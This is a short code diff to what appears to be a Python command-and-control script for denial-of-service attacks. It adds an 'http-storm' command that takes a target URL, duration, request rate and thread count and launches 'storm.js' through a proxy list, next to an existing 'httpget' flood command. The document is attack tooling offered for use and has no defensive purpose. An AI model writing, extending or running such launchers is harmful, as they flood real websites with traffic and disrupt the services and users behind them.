@@ -514,7 +514,18 @@ def main():
                 os.system(f'./httpget {url} 10000 50 100')
             except IndexError:
                 print('Usage: httpget <url>')
-                print('Example: httpget http://example.com')   
+                print('Example: httpget http://example.com')
+                
+        elif "http-storm" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                per = cnc.split()[3]
+                thread = cnc.split()[4]
+                os.system(f'node storm.js {url} {time} {per} {thread} proxies.txt')
+            except IndexError:
+                print('Usage: http-storm <host> <time> <req> <thread> <proxies.txt>')
+                print('Example: http-storm http://example.org 300 15000 1250 proxies.txt ')               
 
         else:
             try:
